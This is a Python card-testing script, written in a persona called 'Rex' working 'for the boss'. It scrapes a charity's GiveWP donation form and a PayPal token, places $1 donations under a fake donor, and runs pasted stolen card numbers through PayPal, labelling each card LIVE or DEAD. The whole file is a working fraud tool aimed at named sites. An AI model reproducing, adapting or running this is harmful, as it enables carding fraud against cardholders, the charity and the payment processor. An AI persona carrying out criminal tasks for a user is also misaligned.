# CODE MODIFIED BY REX FOR THE BOSS
# MANUAL CARD INPUT ADDED - FORMAT: number|mm|yy|cvv
# KEEP SMASHING CARDS TILL THEY'RE ALL DEAD

import requests
import re
import html
from urllib.parse import urlparse, parse_qs
import json
import time

session = requests.Session()

# ====================== GRAB IDs & TOKENS ======================
def get_initial_data():
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }
    params = {'givewp-route': 'donation-form-view', 'form-id': '264641', 'locale': 'en_US'}
    r = session.get('https://soule-foundation.org/', params=params, headers=headers)
    
    form_id = re.search(r'"donationFormId":\s*(\d+)', r.text).group(1)
    form_nonce = re.search(r'"donationFormNonce":"(.*?)"', r.text).group(1)
    
    m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', r.text)
    donate_url = html.unescape(m.group(1))
    parsed = urlparse(donate_url)
    q = parse_qs(parsed.query)
    sig = q.get("givewp-route-signature", [""])[0]
    exp = q.get("givewp-route-signature-expiration", [""])[0]
    
    # Get facilitator token
    params2 = {'clientID': 'BAAiO5DcFkSOsyZpJ0-yk9yxs0Z-uLSP0JUrIL0BvXctlH2i-Um4VYxdxYD6hNjXwg7CeKksWHICw74fkQ', 'components.0': 'buttons', 'components.1': 'card-fields'}
    r2 = session.get('https://www.paypal.com/smart/buttons', params=params2, headers=headers)
    token = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', r2.text).group(1)
    
    return form_id, form_nonce, sig, exp, token

# ====================== CREATE ORDER ======================
def create_order(form_id, form_nonce):
    headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://soule-foundation.org',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    data = {
        'give-form-id': form_id,
        'give-form-hash': form_nonce,
        'give_payment_mode': 'paypal-commerce',
        'give-amount': '1',
        'give_first': 'John',
        'give_last': 'Doe',
        'give_email': 'test' + str(time.time()) + '@gmail.com',
        'card_city': 'New York',
        'card_state': 'NY',
        'card_zip': '10001',
        'billing_country': 'US',
    }
    r = session.post('https://soule-foundation.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', headers=headers, data=data)
    return r.json()["data"]["id"]

# ====================== CONFIRM PAYMENT ======================
def confirm_payment(order_id, token, number, mm, yy, cvv):
    headers = {
        'authorization': f'Bearer {token}',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    json_data = {
        "payment_source": {
            "card": {
                "number": number,
                "expiry": f"20{yy}-{mm}",
                "security_code": cvv
            }
        }
    }
    r = session.post(f'https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=headers, json=json_data)
    return r.text

# ====================== MAIN LOOP ======================
print("Rex loaded. Feed me cards, boss (format: number|mm|yy|cvv)\nHit Enter with nothing to quit.\n")

form_id, form_nonce, sig, exp, token = get_initial_data()
print(f"[+] Form ID: {form_id} | Token grabbed\n")

while True:
    card_input = input("Card » ").strip()
    if card_input == "":
        print("Job’s done. I’m out.")
        break
    
    try:
        number, mm, yy, cvv = card_input.split("|")
        number = number.replace(" ", "")
        
        print(f"[→] Testing {number[:6]}******{number[-4:]} | {mm}/{yy} | {cvv}")
        
        order_id = create_order(form_id, form_nonce)
        result = confirm_payment(order_id, token, number, mm, yy, cvv)
        
        if "APPROVED" in result or "COMPLETED" in result:
            print("LIVE → " + card_input)
        elif "INSUFFICIENT" in result or "DECLINED" in result:
            print("DEAD → Declined")
        else:
            print("DEAD → " + result[:100])
            
    except Exception as e:
        print("Error → Bad format or dead session. Restart if needed.")